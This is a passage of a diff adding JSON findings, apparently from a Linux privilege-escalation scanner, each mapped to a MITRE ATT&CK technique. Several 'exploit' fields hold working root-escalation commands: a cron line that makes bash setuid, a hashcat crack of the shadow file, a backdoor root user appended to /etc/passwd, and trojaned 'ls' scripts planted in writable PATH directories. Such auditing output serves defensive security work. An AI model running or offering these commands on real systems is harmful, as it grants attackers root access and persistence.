+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/crontab",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.602775",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 23,
+    "severity": "CRITICAL",
+    "category": "Files",
+    "title": "Shadow File Readable",
+    "detail": "Password hashes exposed",
+    "mitre_id": "T1005",
+    "exploit": "hashcat -m 1800 shadow.txt rockyou.txt",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.602894",
+    "mitre_name": "Data from Local System",
+    "mitre_tactic": "Collection"
+  },
+  {
+    "id": 24,
+    "severity": "CRITICAL",
+    "category": "Files",
+    "title": "Writable: /etc/shadow",
+    "detail": "System file /etc/shadow is writable",
+    "mitre_id": "T1222",
+    "exploit": "",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.602985",
+    "mitre_name": "File Permissions Modification",
+    "mitre_tactic": "Defense Evasion"
+  },
+  {
+    "id": 25,
+    "severity": "CRITICAL",
+    "category": "Files",
+    "title": "Passwd File Writable",
+    "detail": "Can add root user",
+    "mitre_id": "T1005",
+    "exploit": "echo 'hacker:$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> /etc/passwd",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.603054",
+    "mitre_name": "Data from Local System",
+    "mitre_tactic": "Collection"
+  },
+  {
+    "id": 26,
+    "severity": "CRITICAL",
+    "category": "Files",
+    "title": "Writable: /etc/passwd",
+    "detail": "System file /etc/passwd is writable",
+    "mitre_id": "T1222",
+    "exploit": "",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.603150",
+    "mitre_name": "File Permissions Modification",
+    "mitre_tactic": "Defense Evasion"
+  },
+  {
+    "id": 27,
+    "severity": "CRITICAL",
+    "category": "Files",
+    "title": "/root Directory Readable",
+    "detail": "Root home directory accessible",
+    "mitre_id": "T1083",
+    "exploit": "",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.603235",
+    "mitre_name": "File Discovery",
+    "mitre_tactic": "Discovery"
+  },
+  {
+    "id": 28,
+    "severity": "CRITICAL",
+    "category": "Path",
+    "title": "Writable PATH Directory: /usr/local/sbin",
+    "detail": "Directory in PATH is writable",
+    "mitre_id": "T1574.007",
+    "exploit": "echo '#!/bin/bash\\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /usr/local/sbin/ls && chmod +x /usr/local/sbin/ls",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.604690",
+    "mitre_name": "Path Interception",
+    "mitre_tactic": "Privilege Escalation"
+  },
+  {
+    "id": 29,
+    "severity": "CRITICAL",
+    "category": "Path",
+    "title": "Writable PATH Directory: /usr/local/bin",
+    "detail": "Directory in PATH is writable",
+    "mitre_id": "T1574.007",
+    "exploit": "echo '#!/bin/bash\\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /usr/local/bin/ls && chmod +x /usr/local/bin/ls",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.604905",
+    "mitre_name": "Path Interception",
+    "mitre_tactic": "Privilege Escalation"
+  },
+  {
+    "id": 30,
+    "severity": "CRITICAL",
+    "category": "Path",
+    "title": "Writable PATH Directory: /usr/sbin",
+    "detail": "Directory in PATH is writable",
+    "mitre_id": "T1574.007",
+    "exploit": "echo '#!/bin/bash\\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /usr/sbin/ls && chmod +x /usr/sbin/ls",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.605084",
+    "mitre_name": "Path Interception",
+    "mitre_tactic": "Privilege Escalation"
+  },
+  {
+    "id": 31,
+    "severity": "CRITICAL",
+    "category": "Path",
+    "title": "Writable PATH Directory: /usr/bin",
+    "detail": "Directory in PATH is writable",
+    "mitre_id": "T1574.007",
+    "exploit": "echo '#!/bin/bash\\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /usr/bin/ls && chmod +x /usr/bin/ls",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.605304",
+    "mitre_name": "Path Interception",
+    "mitre_tactic": "Privilege Escalation"
+  },
+  {
+    "id": 32,
+    "severity": "CRITICAL",
+    "category": "Path",
+    "title": "Writable PATH Directory: /sbin",
+    "detail": "Directory in PATH is writable",
+    "mitre_id": "T1574.007",
+    "exploit": "echo '#!/bin/bash\\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /sbin/ls && chmod +x /sbin/ls",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.605476",
+    "mitre_name": "Path Interception",
+    "mitre_tactic": "Privilege Escalation"
+  },
+  {
+    "id": 33,
+    "severity": "CRITICAL",
+    "category": "Path",
+    "title": "Writable PATH Directory: /bin",
+    "detail": "Directory in PATH is writable",
+    "mitre_id": "T1574.007",
+    "exploit": "echo '#!/bin/bash\\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /bin/ls && chmod +x /bin/ls",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.605602",
+    "mitre_name": "Path Interception",
+    "mitre_tactic": "Privilege Escalation"
+  }
+]
